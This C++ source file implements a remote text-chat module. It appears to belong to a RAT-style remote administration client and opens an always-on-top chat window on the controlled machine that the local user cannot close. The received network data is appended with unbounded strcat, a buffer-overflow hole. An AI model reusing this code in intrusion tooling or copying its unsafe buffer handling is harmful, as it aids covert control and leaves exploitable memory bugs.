// TextChat.cpp: implementation of the CTextChat class.
//
//////////////////////////////////////////////////////////////////////

#include "TextChat.h"
#include "resource.h"
#include "stdio.h"
LPARAM Lthis = NULL ;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
extern HMODULE hDllModule;
BOOL bIsEnglishLanguage = TRUE;


CTextChat::CTextChat(CClientSocket *pClient) : CManager(pClient)
{
	Lthis=(LPARAM)this;
	if(Lthis == NULL) 
		return;

	BYTE	bToken[2];
	bToken[0] = TOKEN_TEXTCHAT_START;
	bToken[1] = (BYTE)true;
	Send((LPBYTE)&bToken[0], sizeof(bToken));
	

	WaitForDialogOpen();

	hwnd = CreateDialogParam(hDllModule, MAKEINTRESOURCE(IDD_DIALOG_CHAT),NULL,MyDialogProc, 0L);
//	LoadIcon(hDllModule,(LPCSTR)IDI_ICON_TEXTCHAT);
	if (hwnd)
	{
		UpdateWindow(hwnd);
		ShowWindow(hwnd,SW_SHOWNORMAL);
		SetWindowPos(hwnd,HWND_TOPMOST,0,0,0,0,SWP_NOSIZE|SWP_NOMOVE);
		
		MSG msg;
		while(pClient->IsRunning())
		{
			GetMessage(&msg,NULL,0,0);
			if (msg.wParam == VK_RETURN)
			{
				SendMessage(hwnd,WM_COMMAND,IDC_BUTTON_SEND,0);
				continue;
			}

			TranslateMessage(&msg); 
			DispatchMessage(&msg); 
		}
		EndDialog(hwnd,0);
	}
}

CTextChat::~CTextChat()
{
}

void CTextChat::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}

	memset(m_Text,0,sizeof(m_Text));
	GetDlgItemText(hwnd,IDC_EDIT_CHAT,m_Text,sizeof(m_Text));

	if (bIsEnglishLanguage)
	{
		strcat(m_Text,"==>> Message received:");
	}
	else
	{
		strcat(m_Text,"==>> 接收消息: ");
	}
	
	char szCurrentDateTime[32];     
	SYSTEMTIME systm;     
	GetLocalTime(&systm);     
	wsprintf(szCurrentDateTime, "(%4d-%.2d-%.2d %.2d:%.2d)",     
		systm.wYear, systm.wMonth, systm.wDay,  systm.wHour, systm.wMinute);
	strcat(m_Text,szCurrentDateTime);
	
	strcat(m_Text,":\r\n");


	strcat(m_Text,(char*)lpBuffer);
	strcat(m_Text,"\r\n\r\n");

	SetDlgItemText(hwnd,IDC_EDIT_CHAT,m_Text);
	HWND edit=GetDlgItem(hwnd,IDC_EDIT_CHAT);
	SendMessage(edit,WM_VSCROLL,MAKEWPARAM(SB_BOTTOM,0),0);
}


INT_PTR CALLBACK CTextChat::MyDialogProc(HWND hwndDlg,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	CTextChat *pthis=(CTextChat *)Lthis;
	switch(uMsg)
    {
    case WM_COMMAND:
		{
			switch(wParam)
			{
			case IDC_BUTTON_SEND:
				{
					char str[MAX_PATH];
					GetDlgItemText(hwndDlg,IDC_EDIT_NEWTEXT,str,sizeof(str));
					if (strcmp(str,"")==0)
					{
						break;
					}
					pthis->Send((LPBYTE)str,strlen(str));

					// 复制原来的数据
					memset(pthis->m_Text,0,sizeof(pthis->m_Text));
					GetDlgItemText(hwndDlg,IDC_EDIT_CHAT,pthis->m_Text,sizeof(pthis->m_Text));

					if (bIsEnglishLanguage)
					{
						strcat(pthis->m_Text,"<<== Message sending:");
					}
					else
					{
						strcat(pthis->m_Text,"<<== 发送消息: ");
					}

					char szCurrentDateTime[32];     
					SYSTEMTIME systm;     
					GetLocalTime(&systm);     
					wsprintf(szCurrentDateTime, "(%4d-%.2d-%.2d %.2d:%.2d)",     
						systm.wYear, systm.wMonth, systm.wDay,  systm.wHour, systm.wMinute);
					strcat(pthis->m_Text,szCurrentDateTime);

					strcat(pthis->m_Text,":\r\n");
					strcat(pthis->m_Text,str);
					strcat(pthis->m_Text,"\r\n\r\n");
					SetDlgItemText(hwndDlg,IDC_EDIT_CHAT,pthis->m_Text);


					SetDlgItemText(hwndDlg,IDC_EDIT_NEWTEXT,"");
					HWND edit=GetDlgItem(hwndDlg,IDC_EDIT_CHAT);
					SendMessage(edit,WM_VSCROLL,MAKEWPARAM(SB_BOTTOM,0),0); 
				}
				break;
			case  IDC_BUTTON_SWITCH_LANGUAGES:
				{
					if (bIsEnglishLanguage)
					{
						SetDlgItemText(hwndDlg,IDC_STATIC_TIP,"聊天记录");
						SetDlgItemText(hwndDlg,IDC_BUTTON_SWITCH_LANGUAGES,"English");
						SetDlgItemText(hwndDlg,IDC_BUTTON_SEND,"发送\r\n(回车键)");
						SetWindowText(hwndDlg,"远程交谈....");
						bIsEnglishLanguage = FALSE;
					}
					else
					{
						SetDlgItemText(hwndDlg,IDC_STATIC_TIP,"The chat record:");
						SetDlgItemText(hwndDlg,IDC_BUTTON_SWITCH_LANGUAGES,"中文");
						SetWindowText(hwndDlg,"Remote Text Chat....");
						SetDlgItemText(hwndDlg,IDC_BUTTON_SEND,"Send Out\r\n(Enter)");
						bIsEnglishLanguage = TRUE;
					}
				}
				break;
			default:
				return 0;
			}
		}
		break;
	case WM_CLOSE:
		{
			return 0;
		}
		break;
	default:
		break;
	}
	return FALSE;
}